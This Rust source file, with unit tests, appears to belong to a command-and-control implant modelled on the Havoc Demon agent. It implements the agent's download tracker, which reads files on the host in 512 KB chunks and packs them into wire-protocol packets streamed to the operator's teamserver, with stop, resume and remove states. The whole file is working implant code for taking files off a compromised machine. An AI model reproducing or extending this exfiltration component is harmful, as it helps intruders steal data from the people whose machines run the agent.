//! Download tracker for managing active file transfers.
//!
//! Mirrors the Demon agent's `DOWNLOAD_DATA` linked list: each entry tracks an
//! open file handle, cumulative bytes read, and a state flag that the
//! `CommandTransfer` management commands can inspect or mutate.

use std::fs::File;
use std::io::Read;

use tracing::{info, warn};

// ─── Constants ──────────────────────────────────────────────────────────────

/// Default download chunk size for HTTP transport (512 KB, matches Demon).
pub const DOWNLOAD_CHUNK_SIZE: usize = 0x80000;

/// Download mode constants matching the Demon wire protocol.
pub const DOWNLOAD_MODE_OPEN: u32 = 0;
pub const DOWNLOAD_MODE_WRITE: u32 = 1;
pub const DOWNLOAD_MODE_CLOSE: u32 = 2;

/// Download close reason constants.
pub const DOWNLOAD_REASON_FINISHED: u32 = 0;
pub const DOWNLOAD_REASON_REMOVED: u32 = 1;

/// State of a tracked download.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum DownloadState {
    Running = 1,
    Stopped = 2,
    Remove = 3,
}

impl From<DownloadState> for u32 {
    fn from(s: DownloadState) -> u32 {
        s as u32
    }
}

/// A single active download being streamed to the teamserver.
#[derive(Debug)]
pub struct DownloadEntry {
    /// Random file ID shared between agent and teamserver.
    pub file_id: u32,
    /// Open file handle for reading chunks.
    pub file: File,
    /// The `request_id` from the original download task, used for callback packets.
    pub request_id: u32,
    /// Bytes remaining to read.
    pub remaining: u64,
    /// Cumulative bytes already read and sent.
    pub read_size: u64,
    /// Current transfer state.
    pub state: DownloadState,
}

/// Packet produced by the download push routine, ready to be sent as a callback.
#[derive(Debug, Clone)]
pub struct DownloadPacket {
    /// Command ID for the callback envelope (always `COMMAND_FS`).
    pub command_id: u32,
    /// The request ID to echo back in the callback.
    pub request_id: u32,
    /// Serialised payload bytes.
    pub payload: Vec<u8>,
}

/// Tracks all active file downloads for the agent.
#[derive(Debug, Default)]
pub struct DownloadTracker {
    entries: Vec<DownloadEntry>,
    /// Reusable chunk buffer to avoid per-push allocation.
    chunk_buf: Vec<u8>,
}

impl DownloadTracker {
    /// Create a new empty tracker.
    pub fn new() -> Self {
        Self { entries: Vec::new(), chunk_buf: Vec::new() }
    }

    /// Register a new download. Returns the assigned random file ID.
    pub fn add(&mut self, file: File, request_id: u32, file_size: u64) -> u32 {
        let file_id = rand::random::<u32>();
        info!(file_id = format_args!("{file_id:08x}"), file_size, "download added");
        self.entries.push(DownloadEntry {
            file_id,
            file,
            request_id,
            remaining: file_size,
            read_size: 0,
            state: DownloadState::Running,
        });
        file_id
    }

    /// Look up a download by file ID.
    pub fn get(&self, file_id: u32) -> Option<&DownloadEntry> {
        self.entries.iter().find(|e| e.file_id == file_id)
    }

    /// Look up a mutable download by file ID.
    pub fn get_mut(&mut self, file_id: u32) -> Option<&mut DownloadEntry> {
        self.entries.iter_mut().find(|e| e.file_id == file_id)
    }

    /// Return an iterator over `(file_id, read_size, state)` for all active entries.
    pub fn list(&self) -> impl Iterator<Item = (u32, u64, DownloadState)> + '_ {
        self.entries.iter().map(|e| (e.file_id, e.read_size, e.state))
    }

    /// Return whether there are any active downloads.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Push one chunk per running download, returning packets to send.
    ///
    /// This mirrors the Demon's `DownloadPush()` function: for each running
    /// download, read up to `DOWNLOAD_CHUNK_SIZE` bytes, emit a WRITE packet,
    /// and when the file is exhausted emit a CLOSE packet and mark for removal.
    /// Entries marked `Remove` are cleaned up at the end.
    pub fn push_chunks(&mut self, fs_command_id: u32) -> Vec<DownloadPacket> {
        if self.entries.is_empty() {
            return Vec::new();
        }

        // Ensure the chunk buffer is allocated.
        if self.chunk_buf.len() < DOWNLOAD_CHUNK_SIZE {
            self.chunk_buf.resize(DOWNLOAD_CHUNK_SIZE, 0);
        }

        let mut packets = Vec::new();

        for entry in &mut self.entries {
            if entry.state != DownloadState::Running {
                continue;
            }

            // Read a chunk from the file.
            let bytes_read = match entry.file.read(&mut self.chunk_buf) {
                Ok(n) => n,
                Err(e) => {
                    warn!(
                        file_id = format_args!("{:08x}", entry.file_id),
                        error = %e,
                        "download read failed — marking for removal"
                    );
                    entry.state = DownloadState::Remove;
                    0
                }
            };

            if bytes_read > 0 {
                entry.remaining = entry.remaining.saturating_sub(bytes_read as u64);
                entry.read_size += bytes_read as u64;

                // Build WRITE packet: [subcmd=Download(2)][mode=WRITE][file_id][chunk_data]
                let mut payload = Vec::with_capacity(16 + bytes_read);
                payload.extend_from_slice(&2u32.to_be_bytes()); // FS subcmd: Download
                payload.extend_from_slice(&DOWNLOAD_MODE_WRITE.to_be_bytes());
                payload.extend_from_slice(&entry.file_id.to_be_bytes());
                // PackageAddBytes: [u32 BE length][data]
                payload.extend_from_slice(&(bytes_read as u32).to_be_bytes());
                payload.extend_from_slice(&self.chunk_buf[..bytes_read]);

                packets.push(DownloadPacket {
                    command_id: fs_command_id,
                    request_id: entry.request_id,
                    payload,
                });
            }

            // If file exhausted, send CLOSE and mark for removal.
            if bytes_read == 0 || entry.remaining == 0 {
                let mut close_payload = Vec::with_capacity(20);
                close_payload.extend_from_slice(&2u32.to_be_bytes()); // FS subcmd: Download
                close_payload.extend_from_slice(&DOWNLOAD_MODE_CLOSE.to_be_bytes());
                close_payload.extend_from_slice(&entry.file_id.to_be_bytes());
                close_payload.extend_from_slice(&DOWNLOAD_REASON_FINISHED.to_be_bytes());

                packets.push(DownloadPacket {
                    command_id: fs_command_id,
                    request_id: entry.request_id,
                    payload: close_payload,
                });

                entry.state = DownloadState::Remove;
            }
        }

        // Purge entries marked for removal.
        self.entries.retain(|e| e.state != DownloadState::Remove);

        packets
    }

    /// Mark all downloads whose `request_id` matches as [`DownloadState::Remove`].
    ///
    /// Returns the number of entries that were marked.  The actual cleanup
    /// happens on the next [`push_chunks`] call.
    pub fn mark_removed_by_request_id(&mut self, request_id: u32) -> usize {
        let mut count = 0;
        for entry in &mut self.entries {
            if entry.request_id == request_id && entry.state != DownloadState::Remove {
                entry.state = DownloadState::Remove;
                count += 1;
            }
        }
        count
    }

    /// Number of active downloads.
    pub fn len(&self) -> usize {
        self.entries.len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn temp_file_with_content(content: &[u8]) -> (File, std::path::PathBuf) {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("specter_test_{}", rand::random::<u32>()));
        {
            let mut f = File::create(&path).expect("create temp file");
            f.write_all(content).expect("write temp file");
        }
        let f = File::open(&path).expect("open temp file");
        (f, path)
    }

    #[test]
    fn add_and_get() {
        let mut tracker = DownloadTracker::new();
        let (file, path) = temp_file_with_content(b"hello");
        let file_id = tracker.add(file, 42, 5);
        assert!(tracker.get(file_id).is_some());
        assert_eq!(tracker.get(file_id).map(|e| e.request_id), Some(42));
        assert_eq!(tracker.len(), 1);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn list_returns_all_entries() {
        let mut tracker = DownloadTracker::new();
        let (f1, p1) = temp_file_with_content(b"aaa");
        let (f2, p2) = temp_file_with_content(b"bbb");
        tracker.add(f1, 1, 3);
        tracker.add(f2, 2, 3);
        let items: Vec<_> = tracker.list().collect();
        assert_eq!(items.len(), 2);
        let _ = std::fs::remove_file(p1);
        let _ = std::fs::remove_file(p2);
    }

    #[test]
    fn push_chunks_sends_write_and_close_for_small_file() {
        let content = b"test data";
        let mut tracker = DownloadTracker::new();
        let (file, path) = temp_file_with_content(content);
        let file_id = tracker.add(file, 10, content.len() as u64);

        let fs_cmd_id = 15; // CommandFs
        let packets = tracker.push_chunks(fs_cmd_id);

        // Should get a WRITE packet followed by a CLOSE packet.
        assert_eq!(packets.len(), 2);
        assert_eq!(packets[0].command_id, fs_cmd_id);
        assert_eq!(packets[0].request_id, 10);
        assert_eq!(packets[1].command_id, fs_cmd_id);
        assert_eq!(packets[1].request_id, 10);

        // Verify WRITE packet contains file_id and chunk data.
        let write_payload = &packets[0].payload;
        let mode = u32::from_be_bytes(write_payload[4..8].try_into().expect("mode"));
        assert_eq!(mode, DOWNLOAD_MODE_WRITE);
        let fid = u32::from_be_bytes(write_payload[8..12].try_into().expect("fid"));
        assert_eq!(fid, file_id);

        // Verify CLOSE packet.
        let close_payload = &packets[1].payload;
        let close_mode = u32::from_be_bytes(close_payload[4..8].try_into().expect("mode"));
        assert_eq!(close_mode, DOWNLOAD_MODE_CLOSE);
        let close_reason = u32::from_be_bytes(close_payload[12..16].try_into().expect("reason"));
        assert_eq!(close_reason, DOWNLOAD_REASON_FINISHED);

        // Entry should have been purged.
        assert!(tracker.is_empty());

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn push_chunks_skips_stopped_downloads() {
        let mut tracker = DownloadTracker::new();
        let (file, path) = temp_file_with_content(b"data");
        let file_id = tracker.add(file, 1, 4);
        tracker.get_mut(file_id).expect("entry").state = DownloadState::Stopped;

        let packets = tracker.push_chunks(15);
        assert!(packets.is_empty());
        // Entry should still be present (not purged).
        assert_eq!(tracker.len(), 1);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn state_mutations() {
        let mut tracker = DownloadTracker::new();
        let (file, path) = temp_file_with_content(b"x");
        let file_id = tracker.add(file, 1, 1);

        // Stop
        tracker.get_mut(file_id).expect("entry").state = DownloadState::Stopped;
        assert_eq!(tracker.get(file_id).expect("entry").state, DownloadState::Stopped);

        // Resume
        tracker.get_mut(file_id).expect("entry").state = DownloadState::Running;
        assert_eq!(tracker.get(file_id).expect("entry").state, DownloadState::Running);

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn empty_tracker_push_returns_nothing() {
        let mut tracker = DownloadTracker::new();
        let packets = tracker.push_chunks(15);
        assert!(packets.is_empty());
    }

    #[test]
    fn mark_removed_by_request_id_marks_matching_entries() {
        let mut tracker = DownloadTracker::new();
        let (f1, p1) = temp_file_with_content(b"aaa");
        let (f2, p2) = temp_file_with_content(b"bbb");
        let id1 = tracker.add(f1, 42, 3);
        let id2 = tracker.add(f2, 99, 3);

        let count = tracker.mark_removed_by_request_id(42);
        assert_eq!(count, 1);
        assert_eq!(tracker.get(id1).expect("entry").state, DownloadState::Remove);
        assert_eq!(tracker.get(id2).expect("entry").state, DownloadState::Running);

        let _ = std::fs::remove_file(p1);
        let _ = std::fs::remove_file(p2);
    }

    #[test]
    fn mark_removed_by_request_id_returns_zero_when_no_match() {
        let mut tracker = DownloadTracker::new();
        let (f1, p1) = temp_file_with_content(b"x");
        tracker.add(f1, 10, 1);

        let count = tracker.mark_removed_by_request_id(999);
        assert_eq!(count, 0);

        let _ = std::fs::remove_file(p1);
    }

    #[test]
    fn mark_removed_by_request_id_skips_already_removed() {
        let mut tracker = DownloadTracker::new();
        let (f1, p1) = temp_file_with_content(b"x");
        let id1 = tracker.add(f1, 42, 1);
        tracker.get_mut(id1).expect("entry").state = DownloadState::Remove;

        let count = tracker.mark_removed_by_request_id(42);
        assert_eq!(count, 0); // already removed, shouldn't count again

        let _ = std::fs::remove_file(p1);
    }
}
